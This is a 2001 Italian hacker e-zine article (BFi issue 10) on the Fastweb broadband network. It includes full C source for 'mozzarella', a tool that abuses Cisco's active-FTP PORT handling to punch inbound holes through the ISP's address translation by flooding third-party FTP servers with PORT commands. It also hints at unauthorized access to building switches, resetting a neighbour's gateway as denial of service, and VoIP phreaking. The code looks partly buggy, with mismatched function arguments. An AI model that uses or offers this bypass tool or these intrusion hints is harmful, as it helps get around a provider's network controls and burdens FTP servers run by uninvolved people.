@@ -1,0 +1,922 @@
+==============================================================================
+-----------[ BFi numero 10, anno 4 - 30/09/2001 - file 13 di 18 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ i0 FASTWEB E TU?
+-----[ naif <naif@blackhats.it>
+
+
+<DISCLAIMER>
+"Le opinioni e le informazioni espresse nel presente documento appartengono
+all'autore e non ad aziende: esse non rappresentano in alcuno modo idee,
+politiche aziendali o servizi specifici se non il pensiero e l'esperienza
+dell'autore stesso.
+
+Il disclaimer standard si applica al presente documento, in particolare modo
+per la non responsabilita' dell'autore, naif, verso qualunque tipo di danni
+- causati direttamente o indirettamente e conseguenti alla lettura del
+presente documento e/o all'utilizzo illegale o fraudolento delle informazioni
+e/o funzionalita' ivi contenute.
+
+naif  non si assume alcuna responsabilita' per i contenuti di questo documento
+e cosi' come di eventuali errori od omissioni e o di qualunque documento,
+prodotto o servizio da esso derivati, indirettamente o meno.
+
+Il presente documento puo' essere liberamente distribuito, pubblicato o
+copiato con ogni mezzo disponibile a patto che lo stesso non venga modificato
+in alcun modo e previa autorizzazione scritta dell'autore.
+
+E' assolutamente vietato appropriarsi della proprieta' intellettuale
+dell'opera, ovverosia spacciarsi per l'autore, tradurre questo articolo in
+altre lingue appropriandosene la paternita' o estrapolare singoli paragrafi
+spacciandosi per l'autore degli stessi."
+</DISCLAIMER>
+
+- Eccomi qui, che sono in ufficio al 10 Luglio e c'e' ben poca gente,
+   e allora, visto che non ho nulla di meglio da fare, mi metto a spiegare
+   come funziona Fastweb, che restrizioni impone a noi utenti Residenziali
+   sfigati, e naturalmente come bypassarle ringraziando naturalmente mamma
+   Cisco x come lavora da cane.
+- Tra Hackers At Large e vacanze varie, rieccomi che riprendo questo articolo
+   al 25 Agosto con l'intento pero' di aggiungerci cio' che non avrei voluto
+   aggiungerci: dopo 30 minuti di litigata con l'ufficio reclami di Fastweb,
+   penso sia il caso di avviare un sano sputtanamento.
+- E dopo che non ho fatto un cazzo per un altro bel po' di tempo, mi ritrovo
+   nuovamente a scrivere qui perche' smaster mi ha detto che dobbiamo uscire
+   sabato e io dopo parecchi mesi non ho ancora finito questo articolo.
+  
+ Indice
+ 1. Introduzione
+ 2. Come Funziona Fastweb ( Contratto Residenziale )
+  2.1 La rete
+  2.2.1 Il Cisco Router in casa
+  2.2.2 Il CPV ( Home Access Gateway ) 
+ 3.  Problemi e restrizioni della rete Fastweb
+  3.1 Connessioni DATI via modem
+  3.2 Limite di 5 MAC Address per porta
+  3.3 Comunicazione Fastweb <---> Fastweb + Sicurezza
+  3.4 Comunicazione Internet <---> Fastweb
+  3.5 Timeout connessioni TCP idle
+ 4. Come ti offro servizi su rete Fastweb
+  4.1 Come funziona l'FTP
+  4.2 mozzarella.c  - La Teoria
+  4.3 mozzarella.c  - La Pratica
+  4.4 mozzarella.c  - Il Codice
+  4.5 Idee malate
+ 5. La nuova frontiera del phreaking: Voice Over IP
+  5.1 phreaking in rete Fastweb
+
+  
+1. Introduzione
+  
+  Fastweb e' il primo fornitore di accesso a "banda larga", 10MB, in Italia,
+  che ha iniziato l'anno scorso a offrire servizi a Milano sfruttando
+  l'infrastruttura in fibra di e-biscom (a tutti gli effetti Fastweb e' di
+  e-biscom), che si sta espandendo a Roma e ha come progetto finale di
+  ritrovarsi una rete con copertura nazionale.
+  
+  Fastweb offre servizi di connettivita' a internet, nonche' telefonia,
+  sfruttando pero' la rete IP tramite VoIP (protocollo h323).
+  
+  Nell'offerta di base (almeno in quella che ho io, ora non so se qualcosa e'
+  cambiato) sono inclusi:
+   - Collegamento a internet 10Mbit/s
+   - Chiamate verso utenti Fastweb gratuite
+   - 4 ore di telefonate locali al mese (non cumulabili)
+   - 2 ore di telefonate nazionali al mese (non cumulabili)
+   - Account di posta per ogni membro della famiglia (max. 6)
+   - Massimo 3 computer collegabili alla rete
+
+
+2. Come funziona Fastweb ? ( Contratto Residenziale )
+  
+  Fastweb ha realizzato una MAN (Metropolitan Area Network), praticamente una
+  enorme rete locale (LAN) in fibra su scala metropolitana.
+
+ 2.1  La rete
+
+  Nella rete Fastweb la suddivisione di essa e' effettuata in Citta' (Milano)
+  Pop (zona della citta', io sono nella "ovest" ), Minipop (id numerico), Area
+  Elementare (id numerico), Progessivo Edificio (Id numerico).
+
+  Dallo switch della sede centrale partono cavi in fibra ottica che terminano
+  su i Router di zona (Pop), su cui terminano e ripartono link in fibra verso
+  gli Switch Cisco Cayalyst di quartiere (Minipop).
+  Da questi, i link arrivano fino allo "switch condominiale" che non e' altro
+  che un catalyst che opera a Layer2 che viene installato nella cantina del 
+  vostro palazzo ed e' il punto dove termina la fibra e partono i cavi
+  ethernet (1 per ogni cliente) su per il palazzo, terminandovi in casa su una
+  porta rj-45.
+  Questi Switch sono solitamente inseriti in box difficilmente "apribili", ma
+  che, in determinate occasioni, danno la possibilita' a chiunque con un po'
+  di pazienza di aprirli, fare password recovery e averne accesso "non
+  autorizzato".
+
+  L'indirizzamento viene normalmente gestito tramite DHCP, che assegna a noi,
+  poveri utenti residenziali, ip in classe 10.x.x.x (anche se mi e' stato
+  confermato da alcuni anche ip sulla classe 1.1.x.x, PURA ANARCHIA), mentre
+  con uno sniffer, vediamo tranquillamente il traffico multicast EIGRP e HSRP
+  generato dai router in classe 172.x.x.x :
+
+  <traffico EIGRP>
+  19:24:12.372791 172.xx.xx.2 > 224.0.0.10:  ip-proto-88 40 [tos 0xc0]
+   (ttl 2, id 0, len 60)
+  19:24:13.132349 172.xx.xx.3 > 224.0.0.10:  ip-proto-88 40 [tos 0xc0]
+   (ttl 2, id 0, len 60)
+  </traffico EIGRP>
+  <traffico HSRP>
+  19:24:10.004537 172.xx.xx.2.1985 > 224.0.0.2.1985:  [udp sum ok] udp 20 
+   [tos 0xc0]  (ttl 2, id 0, len 48)
+  19:24:11.536225 172.xx.xx.3.1985 > 224.0.0.2.1985:  [udp sum ok] udp 20 
+   [tos 0xc0]  (ttl 2, id 0, len 48)
+  19:24:12.944679 172.xx.xx.2.1985 > 224.0.0.2.1985:  [udp sum ok] udp 20 
+   [tos 0xc0]  (ttl 2, id 0, len 48)
+  </traffico HSRP>
+
+  <NOTA>
+  HSRP sta per "Hot Standby Router Protocol" ed e' utilizzato dai router cisco
+  per gestire configurazioni in failover, per cui un router e' master e
+  l'altro e' slave e se il primo fallisce il secondo si attiva.
+
+  EIGRP sta per "Enhanced Interior Gateway Routing Protocol" ed e' un
+  protocollo di routing proprietario cisco che supporta il VLSM e altre
+  funzionalita' tipiche dei protocolli di routing Link-State moderni.
+  <NOTA>
+
+  Proprio molto interessante e' quest'ultima classe, dove troviamo al .1 .2 e
+  .3 i router, mentre dal .5 in su ci sono gli IP dei CPV.
+
+  Su internet si esce tramite PAT (Port Address Translation), la tecnologia di
+  NAT che su linux si chiama MASQUERADING (piu' ip interni, escono su un solo
+  ip esterno), facendo uscire intere zone con un unico ip pubblico su
+  internet. Ovviamente e' possibile effettuare solo connessioni dall'interno
+  verso l'esterno, e solo tcp e udp.
+
+2.2.1 Il Cisco Router in casa
+
+  Inizialmente nelle nostre case, veniva posto un Cisco 2600 con schede VoIP,
+  che, tramite password recovery, rivelava interessanti dettagli sulla
+  configurazione, quali i gateway h323, i codec utilizzati in ordine di
+  priorita' (G.729, G.711, G.722), nonche' username e password degli
+  sfigatissimi consulenti IBM che venivano a installare le apparecchiature.
+  Attualmente questo viene installato solo nei contratti aziendali da lire 
+  250.000, lira +, lira -.
+
+2.2.2 Il CPV ( Home Access Gateway )
+  
+  Una volta pronti in serie i CPV (chiamati da Fastweb Home Access Gateway),
+  hanno iniziato a montare questi graziosi dispositivi hardware, delle
+  dimensioni di un una scatola di Ferrero roche', che hanno le caratteristiche
+  che potete trovare sul sito del produttore telsey:
+  
+  http://www.telsey.it/sheet.asp?ID=CPV
+  
+  Le sue funzioni sono essenzialmente 2:
+  - Funziona da "hub" per i pc domestici
+  - Funziona da proxy h323, in questo modo noi possiamo collegare fino a 2
+    normali telefoni alle sue prese rj-11, e lui pensera' a far viaggiare la
+    vostra voce su IP al + vicino gatekeeper.
+
+  N.B.: Notare la feature "Tracking call for security", il che significa che
+  sono gia' predisposti per consentire le intercettazioni...
+  
+  Questi simpatici aggeggini sono gestibili via SNMP mentre via web e' 
+  possibile visualizzarne la configurazione e, meraviglia delle meraviglie,
+  "resettarli" (e qui c'e' solo il primo dei possibili Denial Of Service che
+  potreste fare al vostro vicino di casa che vi rompe le palle perche' avete
+  la musica troppo alta e lui sta telefonando).
+  AGGIORNAMENTO: ho notato che nel nuovo firmware chiede una password per
+  resettarli, ma ovviamente avrete gia' capito quale e'.
+
+
+3.  Problemi e restrizioni della rete Fastweb
+  
+  Nonostante Fastweb sia stata avvertita dei problemi che ora vi esporro',
+  sembrerebbe che di utenti che notano queste cose siano 1 su 10000,
+  mentre i restanti 9999 si godono i filmatini in streaming ASF, e scaricano
+  mp3 400k/s, felici di avere quei 10Mb sotto al culo.
+  
+3.1 Connessioni DATI via modem
+  
+    Essendo il sistema telefonico basato su una architettura VoIP, i
+    collegamenti dati funzionano solo con alcuni modem, come mi e' stato
+    confermato dall'helpdesk Fastweb, e a basse velocita'.
+    Quindi, se tra di voi c'e' ancora qualche fanatico del wardialing
+    (consiglio sempre di rifarsi periodicamente 800-89-XXXX), evitate di
+    eliminare il contratto con un operatore fisso, in quanto le vostre
+    connessioni dati faranno pena.
+
+    ATTENZIONE, RICORDATE CHE IN CASO DI EMERGENZA, SE VA VIA LA CORRENTE, NON
+    POTRETE EFFETTUARE CHIAMATE DI EMERGENZA PERCHE' IL CPV SI SPEGNERA', IDEM
+    PER LO SWITCH IN CANTINA.
+
+3.2 Limite di 5 MAC Address per porta
+
+    A quanto pare, quei furboni di fastweb sui Cisco Catalyst in cantina hanno
+    fatto si' che per ogni porta tutti i mac address in transito vengono
+    registrati e al sesto che incontrano mettono in shutdown l'interfaccia. A
+    me quando si e' rotta la scheda PCMCIA del portatile, una volta montata la
+    nuova e' andata giu' la rete, ho chiamato l'helpdesk fastweb, che mi ha
+    spiegato la situazione, e io mi sono incazzato come un'ape. Quando ho
+    cambiato lavoro, nuovo notebook, lo collego e mi va giu' di nuovo la rete.
+    Unica soluzione: avere una macchina che fa da Firewall facendo nat su
+    un ip interno Fastweb, ma ovviamente una doppia NAT prima di arrivare su
+    internet aggiunge notevoli problemi nel capire dove intervenire quando
+    qualcosa non funziona.
+  
+3.3 Comunicazione Fastweb <---> Fastweb + Sicurezza
+
+    Nonostante non tutte le reti interne siano raggiungibili fra di loro, una
+    grossa parte lo e', ed e' facile incontrare parecchie lan di varie
+    aziende completamente "sbragate" in quanto il link interno "fastweb" non
+    viene visto come un rischio e l'idea di un firewall non sembra opportuna
+    (come i link x.25 o i RAS messi su numeri verdi d'altronde).
+
+    Sarebbe inoltre carino creare delle comunita' virtuali sfruttando la rete
+    interna Fastweb (io lancio l'idea, chi la raccoglie mi contatti...).
+
+3.4 Comunicazione Internet <---> Fastweb
+    
+    Noi possiamo collegarci a internet, ma utenti internet non possono
+    collegarsi verso di noi, e qui non ci sono piu' i soliti problemucci
+    idioti stile "non ho un ip fisso" che alla fine si risolve con dynamic
+    dns, ma il problema e' proprio strutturale e la risoluzione di questo e'
+    uno dei due punti "caldi" dell'articolo.
+
+3.5 Timeout connessioni TCP idle
+   
+    Questo problema, probabilmente non verra' riscontrato da tutti, ma
+    comunque da molti, in quanto non in tutte le zone e' stata fatta questa
+    modifica da quei deficienti di fastweb.
+    A quanto pare, dato che tutte le connessioni effettuate sono inserite
+    nella tabella di connessioni del router di fastweb, loro possono gestirle
+    come gli pare e hanno impostato che il timeout di qualsiasi connessione
+    TCP che sia "idle" per 60 secondi viene automaticamente resettata (nel
+    senso che manda un RST a tutti e 2 i peer della comunicazione).
+    Questo comporta "parecchi svantaggi"... tanto per elencarne qualcuno:
+    - Se siete su irc, ogni 60 secondi di idle venite disconnessi.
+    - Se lavorate in ssh/telnet su un terminale dopo 60 secondi venite
+      disconnessi.
+    - Se scaricare un file via ftp senza avere "hash" attivo, e impiegate piu'
+      di 60 secondi per scaricare un file, la connessione di controllo viene
+      resettata e il piu' dei client ftp "si impallano".
+
+
+4. Come ti offro servizi su rete Fastweb
+  
+  Come descritto precedentemente, uscendo tutti quanti in PAT, non abbiamo
+  modo di permettere connessioni in ingresso e quindi avere il nostro sito
+  web con il mirror di ftp.kernel.org o quello che vi pare.
+  
+  Durante un viaggio in treno con recidivo verso verona, andando a casa di
+  cyrax, mi e' venuto il flash, l'illuminazione! La madonna si e' presentata
+  davanti a me e mi ha sussurrato nell'orecchio "hey naif, usa l'ftp..." .
+  Oh yeah! Grazie dio, tu si' che hai capito tutto!
+  
+  L'implementazione pratica di questo giochino e' stata fatta con XXXXXX (non
+  vuole fare sapere il suo nome... posso capirlo), con scleri notevoli per
+  fare tunnel pppd over ssh, port forwarding, masquerading e minchiate varie,
+  il tutto per poterlo fare collegare sulla mia macchina di casa passando
+  dalla mia box in ufficio.
+  
+  Prima di tutto e' necessario spiegare in poche righe come funziona una
+  connessione FTP...
+  
+4.1  Come funziona l'FTP
+
+  L'ftp e' un protocollo che utilizza 2 canali, uno per i comandi e uno x
+  trasferire i file che a sua volta opera in diverse modalita' (attiva e
+  passiva), e la gestione di questo da parte dei firewall e' sempre stata
+  molto complessa, e ha spesso rivelato interessanti modi per bypassarli.
+
+  Nella modalita' attiva il client comunica al server una porta locale a cui
+  quest'ultimo dovra' collegarsi per inviare/ricevere file.
+  
+  Nella modalita' passiva il client comunica al server di volere utilizzare 
+  questa modalita' tramite il comando PASV, e a questo punto il server gli
+  risponde indicando la porta a cui il client dovra' collegarsi per
+  inviare/ricevere file.
+  
+  A noi interessa mostrare il funzionamento della modalita' attiva per cui
+  una normale sessione avviene in questo modo:
+  
+  Client: 192.168.1.4
+  Server: 172.16.1.9
+  
+  Il client si collega all'ftp server sulla porta 21/tcp dove invia tutti i
+  comandi e riceve le relative risposte:
+  
+             Canale di controllo
+  Client      ----------------> 21/tcp Server
+  USER pinco  ---------------->
+              <--------------- 331 Insert your password please.
+  PASS pallino ---------------> 
+              <--------------- 230 Password correct, Thanks!
+  
+  Ora i comandi per scaricare il file in /pub/test_file utilizzando la
+  modalita' attiva:
+
+  PORT 192,168,1,4,100,99 ------------->
+                          <------------- 200 PORT command successful.
+  RETR /pub/test_file     -------------->
+                          <------------- 150 Opening BINARY mode data
+					 connection for test_file
+  
+  A questo punto il server FTP si colleghera' alla porta 25699/tcp di
+  192.168.1.4 per inviargli il file.
+  
+  172.16.1.9:$RANDOM    ----------------> 192.168.1.4:25699
+ 
+  * Nota: il formato del comando PORT e': n1,n2,n3,n4,z1,z2 dove n* e' un ip
+  che al posto dei punti ha le virgole, e dove z1 e z2 vengono utilizzati per
+  calcolare la porta di destinazione nel formato:  ( z1*256 + z2 ) . Bella
+  merda l'ftp vero?
+  
+  Ora che abbiamo capito come funziona la modalita' attiva, pensiamo a come i
+  router e i firewall devono gestire questo complesso processo quando c'e' di
+  mezzo la NAT considerando tutti i problemi che derivano dal fatto che:
+  
+  1 - Quando il client lancia il comando PORT utilizza un IP interno che deve
+      essere riscritto e non e' un semplice header, ma un comando nel payload
+      del pacchetto che deve essere parsato.
+  2 - Quando la mappatura non e' one-to-one, ma si usa il PAT, potrebbero
+      "teoricamente" esserci altri utenti che lanciano un comando PORT con la
+      stessa porta di destinazione, che andrebbe eventualmente riscritta
+      anch'essa.
+  3 - Se io lancio un comando PORT dall'interno, dovrebbe potersi collegare a
+      me solo e soltanto il server a cui io ho lanciato questo comando.
+  4 - Quando lancio un comando PORT, il router dovrebbe permettere il canale
+      di ritorno solo dopo avere ricevuto un bel return code "200 PORT command
+      successful" dal server.
+  
+  Naturalmente alcune di queste cose non si verificano nel modo corretto, in
+  particolare a noi interessano i punti 3 e 4 ed e' cosi' che andiamo a capire
+  come montare un webserver sfruttando i 10MB dell'abbonamento residenziale
+  Fastweb.
+  
+ 4.2 mozzarella.c  - La Teoria
+
+   Da come avrete gia' capito, il nome del programma che e' stato creato per
+   svolgere questo compito e' "mozzarella", di cui ne andiamo a spiegare il
+   funzionamento.
+
+   Quando si apre una connessione FTP in modalita' attiva, come avete letto
+   prima, il client si collega al server per lanciare i comandi, mentre per
+   la connessione DATA e' il server a collegarsi al client.
+   Quando io, utente Fastweb, mi collego a un ftp server e scarico un file, il
+   cisco router che mi presenta su internet si preoccupera' di riscrivere il
+   comando PORT e di consentire una connessione dall'ftp server a me, aprendo
+   un canale temporaneo fra IP_DI_PAT:PORTA ------> MIO_IP_INTERNO:PORTA .
+
+   <ESALTAZIONE>WOW, quindi un modo per offrire servizi esiste!</ESALTAZIONE>
+
+   Ovviamente Cisco, a seguito di un comando PORT, permette la connessione
+   verso IP_DI_PAT:PORTA da qualunque host, per cui se io configuro un web
+   server sulla mia porta 30000, mi collego in ftp a un qualsiasi ftp server
+   e lancio il comando PORT con ultimi parametri 115,560 (che appunto fa'
+   (115*256=29440) + 560 = 30000 ), chiunque da internet potra' aprire
+   una connessione verso la porta 30000/tcp dell'ip di PAT.
+
+   Abbiamo ora capito come funziona, ma ovviamente un servizio web richiede
+   l'apertura di piu' connessioni contemporanee da parte del browser, quindi
+   si rende necessario utilizzare piu' ftp server e sopratutto piu'
+   connessioni verso cui lanciare costantemente i comandi PORT.
+
+   Da test effettuati sul campo sono riuscito a consentire l'inizializzazione
+   di circa 10 connessioni al secondo con una perdita di 2 connessioni su 632
+   utilizzando 3 ftp server remoti con 3 connessioni per ogni ftp server
+   lanciando 4 comandi PORT al secondo.
+
+   Quindi con:
+   - 9 connessioni tcp
+   - 3 ftp server
+   - 36 PORT/secondo
+   riusciamo a consentire in ingresso:
+   - 10 connessioni/secondo
+   Inoltre, in benchmark da me fatti ho avviato alcune sessioni e sono
+   arrivato a 41 sessioni established generando un troughput di 1200kbit/s.
+   <GUARDA CHE FICO>
+   root@XXXXX:~# netstat -na|grep  30000 | grep -c ESTABLISHED
+   41
+   </GUARDA CHE FICO>
+
+ 4.3 mozzarella.c  - La Pratica
+  
+    Nella realta' pero', utilizzare "mozzarella" richiede per comodita'
+    l'utilizzo di un server esterno dato che non possiamo consentire
+    connessioni su porte <=1023 e per qualche motivo strano, su cui non
+    abbiamo voglia di approfondire, solo =>30000.
+
+    Proprio per questo motivo e' difficile dare in giro l'url di un sito
+    dicendo che e' qualcosa tipo http://www.sito.com:30000 ed allora conviene
+    appoggiarsi a un qualsiasi web server esterno, su cui mettere un redirect
+    verso http://IP_DI_PAT:PORTA .
+
+    Bisogna inoltre rendersi conto che inviare 36 PORT/s a un ftp server, puo'
+    dare fastidio al sysadmin di questo ftp server: rispettate la netiquette
+    e fatevi installare un ftp server "finto" da qualche vostro amico.
+
+    L'help di mozzarella penso sia sufficientemente esplicativo:
+
+    Usage: ./mozzarella [-h][-u username -p password][-a][-H host]
+     [-P port_to_open][-L localhost]
+        -h this help
+        -u username for ftp
+        -p password for ftp
+        -H ftp host
+        -L your local ip
+        -P the port to bounce
+        -a use anonymous ftp
+        -r number of PORT commands to send for each server any second
+        -i number of session for ftp
+
+  4.4 mozzarella.c  - Il Codice
+
+<-| mozzarella.c |->
+/*
+        L'autore non e' conosciuto e comunque non si assume alcuna
+        responsabilita' per l'utilizzo di questo programma che viene
+        distribuito senza alcuna garanzia e per puri scopi educativi.
+        Tale programma e' distribuito sotto la licenza GPL presente
+        all'url: http://www.gnu.org/licenses/gpl.html
+
+        Benchmark:
+        3 servers, 3 instances per server, 10 connections/second,
+        2 dropped on 632 :)
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <string.h>
+#include <sys/wait.h>
+#include <sys/time.h>
+
+#define ONESEC 1000000 /* usecs :) */
+#define ANONPWD "modella@lamozzerlla.fastweb.sux"
+
+unsigned long int
+resolv(char *host)
+{
+        unsigned long int ip;
+        struct hostent *he;
+
+        ip = inet_addr(host);
+        if(ip != -1)
+                return ip;
+        he = gethostbyname(host);
+        if(he != NULL) {
+                memcpy(&ip, he->h_addr, sizeof(unsigned long int));
+                return ip;
+        }
+
+        fprintf(stderr, "Cannot resolve %s\n", host);
+        perror("gethostbyname");
+}
+
+int /* -1: EOF, 0: not endline, 1: endline */
+ftp_readline(char *buf, int maxsz)
+{
+        int islast = 0;
+
+        if(!fgets(buf, maxsz, stdin))
+                return -1;
+        if(buf[3] == ' ')
+                islast = 1;
+        while(!strchr(buf, '\n'))
+                if(!fgets(buf, maxsz, stdin))
+                        return islast;
+        return islast;
+}
+
+int
+ftp_connect(char *host, int port)
+{
+        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        struct sockaddr_in sin;
+
+        if(s<0)
+        {
+                perror("socket");
+                return -1;
+        }
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(port);
+        sin.sin_addr.s_addr = resolv(host);
+        if(sin.sin_addr.s_addr == -1) {
+                close(s);
+                return -1;
+        }
+        if(connect(s, (struct sockaddr *)&sin, sizeof(sin))<0)
+        {
+                perror("connect");
+                close(s);
+                return -1;
+        }
+        return s;
+}
+
+int
+ftp_status(char *s)
+{
+        char p[5];
+
+        memcpy(p, s, 4);
+        p[4] = 0;
+
+        return atoi(p);
+}
+
+int
+ftp_login(char *u, char *p)
+{
+        char buf[4096];
+        int r;
+
+        while(!(r = ftp_readline(buf,sizeof(buf))))
+                ;
+
+        if(r < 0)
+        {
+                fprintf(stderr, "Error reading from socket..\n");
+                return -1;
+        }
+        printf("USER %s\r\n", u); fflush(stdout);
+        if((r = ftp_readline(buf, sizeof(buf)))<0) {
+                fprintf(stderr, "Error reading from socket..\n");
+                return -1;
+        }
+        if(ftp_status(buf) == 230)
+                return 0;
+        if(ftp_status(buf) != 331) {
+                fprintf(stderr, "Error logging in : %s\n", buf);
+                return -1;
+        }
+        if(!r) {
+                while(!(r = ftp_readline(buf, sizeof(buf))))
+                        ;
+                if(r < 0)
+                        fprintf(stderr, "Error reading from socket...:%s\n",
+                                buf);
+                return -1;
+        }
+        printf("PASS %s\r\n", p); fflush(stdout);
+        if((r = ftp_readline(buf, sizeof(buf)))<0) {
+                fprintf(stderr, "Error reading from socket..\n");
+                return -1;
+        }
+        if(ftp_status(buf) == 230) {
+                if(!r)
+                        while(!(r = ftp_readline(buf, sizeof(buf))))
+                                ;
+                return 0;
+        }
+        fprintf(stderr, "Error loggin in: %s\n", buf);
+        return -1;
+}
+
+void
+splitip(char *host, int *v)
+{
+        struct in_addr tmp;
+        char *stmp, *q;
+
+        tmp.s_addr = resolv(host);
+        stmp = strdup(inet_ntoa(tmp));
+        q = strtok(host, "."); v[0] = atoi(q);
+        q = strtok(NULL, "."); v[1] = atoi(q);
+        q = strtok(NULL, "."); v[2] = atoi(q);
+        q = strtok(NULL, "."); v[3] = atoi(q);
+        free(stmp);
+}
+
+int
+ftp_port(int ip[4], int port)
+{
+        char dummy[1024];
+        int i;
+
+        printf("SYST\r\n");
+        printf("PORT %u,%u,%u,%u,%u,%u\r\n",
+                ip[0], ip[1], ip[2], ip[3], (port >> 8)&0xFF, port & 0xFF);
+#ifdef VERBOSE
+        fprintf(stderr, "PORT %u,%u,%u,%u,%u,%u\r\n",
+                ip[0], ip[1], ip[2], ip[3], (port >> 8)&0xFF, port & 0xFF);
+#endif
+
+        fflush(stdout);
+        if(ftp_readline(dummy, sizeof(dummy))<0)
+                return -1;
+        else return 0;
+};
+
+int
+create_instances(int num, char *host, int fport,
+        char *u, char *p, int *lip, int port, int pps)
+{
+        int masterpid = getpid(), new;
+
+        while(num)
+        {
+                new = fork();
+                if(new == 0)
+                        return childmain(host,fport,u,p,lip,port);
+                usleep(ONESEC/3);
+                num--;
+        }
+}
+
+int
+main(int argc,char **argv)
+{
+        int c;
+        int port = -1,anonymous=0, ftpport=21,instances=3,hostnum=0,
+                pps = 4;
+        char *host[256], *pass=NULL, *local=NULL, *user = NULL, *s;
+        int local_ip[4];
+
+        while((c = getopt(argc, argv, "i:hu:p:aH:P:L:S:r:"))!=EOF)
+        switch(c)
+        {
+                case 'r':
+                        pps = atoi(optarg);
+                        break;
+                case 'i':
+                        instances = atoi(optarg);
+                        break;
+                case 'u':
+                        user = optarg;
+                        break;
+                case 'p':
+                        pass = optarg;
+                        break;
+                case 'H':
+                        if(hostnum==256) {
+                                printf("No more space\n");
+                                break;
+                        }
+                        host[hostnum++] = optarg;
+                        break;
+                case 'a':
+                        anonymous = 1; break;
+                case 'P':
+                        port = atoi(optarg); break;
+                case 'L':
+                        local = optarg; break;
+                case 'h':
+                default:
+                        printf("Usage: %s [-h][-u username -p password][-a][-H host][-P port_to_open][-L localhost]\n", argv[0]);
+                        printf("\t-h this help\n");
+                        printf("\t-u username for ftp\n");
+                        printf("\t-p password for ftp\n");
+                        printf("\t-H ftp host\n");
+                        printf("\t-L your local ip\n");
+                        printf("\t-P the port to bounce\n");
+                        printf("\t-a use anonymous ftp\n");
+                        printf("\t-r number of PORT commands to send for each server any second\n");
+                        printf("\t-i number of session for ftp\n");
+                        printf("You can specify MORE -H switches.\n");
+                        exit(1);
+                        break;
+        }
+        if(!anonymous && (!user||!pass))
+        {
+                printf("User and/or password missing AND anonymous mode not specified\n");
+                exit(1);
+        }
+        if(!host || port <0)
+        {
+                printf("FTP host or port not specified\n");
+                exit(1);
+        }
+
+        splitip(local, local_ip);
+        if(anonymous) {
+                user = "anonymous";
+                pass = ANONPWD;
+        }
+        for(c = 0; c<hostnum; ++c)
+        {
+                create_instances(instances,
+                host[c],ftpport,user,pass,local_ip,port, pps);
+        }
+
+        exit(0);
+}
+
+int
+childmain(char *host, int ftpport, char *user, char *pass, int *local_ip,
+                int port, int pps)
+{
+
+        int c, d = 0, a;
+
+        while(1) {
+
+        if((c = ftp_connect(host,ftpport))<0 && !d)
+                exit(1);
+        else while(c < 0) {
+                        c = ftp_connect(host, ftpport);
+                        sleep(1);
+                }
+        fprintf(stderr, "+ Connected...\n");
+        dup2(c, 0);
+        dup2(c, 1);
+        if((a = ftp_login(user, pass))<0 && !d) {
+                shutdown(c, 2);
+                close (c);
+                exit(1);
+        } else while(a<0) {
+                        a = ftp_login(user, pass);
+                        sleep(1);
+                }
+        fprintf(stderr, "+ Logged in...\n");
+        d++;
+        while(1)
+        {
+                //fprintf(stderr, "+ Sending...\n");
+                usleep(ONESEC/pps);
+                if(ftp_port(local_ip, port)<0) {
+                        shutdown(c, 2);
+                        close(c);
+                        break;
+                }
+        }
+        }
+}
+<-X->
+
+  4.5 Idee malate
+    
+    Si pensava anche a un'altra idea malata possibile avendo a disposizione
+    2 link, uno con Fastweb e uno con un altro carrier (magari una adsl
+    sfigata), per offrire anche un servizio di FTP con routing asincrono
+    (EHHHHHHHHH PAROLONEEEEEEEE!!!).
+    Cioe': pensiamo al client che si collega all'ftp server sull'IP pubblico
+    della ADSL ed e' costretto ad utilizzare la modalita' passiva.
+    In questo modo e' il server a dire al client:
+    "<Hey bello, collegati a questo IP:PORTA per la connessione DATI e
+    scaricati questo cazzo di file!>".
+
+    E se io modifico l'ftp server affinche', tramite mozzarella, mi apra una
+    porta sul mio IP di PAT sul link con Fastweb e risponda al comando "PASV"
+    del client con un bel:
+    227 Entering Passive Mode (MIO,IP,DI,PAT,+LA,PORTA) ?
+    Vuole dire che avremo un bell'FTP server asimmetrico che gestisce la
+    connessione di controllo su un canale(l'adsl o flat che sia), mentre ne
+    impiega un altro per il canale DATI (Fastweb).
+
+    Se qualcuno implementa questa cosa me lo faccia sapere :)
+
+
+ 5. La nuova frontiera del phreaking: Voice Over IP
+    
+    Volevo, in questo paragrafo, fare una piccola riflessione sul fenomeno
+    del phreaking in Italia negli ultimi anni...
+    Prima si boxava x andare su BBS, Party Line e reti X.25 .
+
+    Quanti di voi ricordano i country direct, le blue box, e quelle dolci
+    sessioni che suonavano cosi':
+
+    <Operatore> Guatemala Buenas Dias?
+    <Voi> Tiri, Tiri', tuuuuuuuuuuuuu
+    
+    e si faceva Wardialing a manetta su 16789XXXX (Range su cui era ed e'
+    pieno di numeri che rispondono dall'altra parte del globo) per trovare
+    paesi C5 e/o carrier di ogni tipo.
+    Poi tutto questo e' passato, i sistemi telefonici C5 praticamente sono
+    rimasti in ben pochi e boxabili solo da alcuni paesi, le reti X.25 non se
+    le caga piu' nessuno, e allora ci siamo messi tutti felicemente a fare
+    wardialing per bucare i peggio sistemi, raggiungere le intranet delle
+    societa' piu' fighe del mondo, scoprendo segreti inimmaginabili.
+    Passato questo periodo, e arrivata internet, c'e' stata una MOLE DI GENTE
+    ENORME che faceva wardialing per trovare i "GreenZ", numeri verdi per
+    collegarsi a internet e irc pullulava di gente che faceva trading di
+    questi numeri.
+    Oggi anche questo periodo e' passato e la gente se ne sbatte di fare
+    wardialing, tanto ci sono le FLAT (con cui la gente ci prende belle
+    denuncie, vedi Galactica e Edisontel incazzati) e c'e' la Broad Band
+    della ADSL (su cui nessuno ha ancora porcheggiato con l'ATM... coraggio 
+    ragazzi, dateci dentro che le reti ATM sono tutte da smontare).
+    E Il phreaking adesso?
+    Si' certo, c'e' ancora una elite (e qui non intendo il termine l33t, ma
+    intendo proprio POCHI) di persone che si dilettano sui numeri verdi e su
+    X.25 facendo i blackhat alla grande, ma il resto delle persone ha 
+    completamente dimenticato il phreaking per colpa dell'IP.
+
+    SVEGLIA!!!!!!!!!
+    Andiamo a fare phreaking su IP con il Voice Over IP!!!!
+    Ma avete visto Fastweb?
+    Ma avete visto Voispring di Tiscali e numerosi altri servizi basati sulla
+    suite di  protocolli H323 ?
+
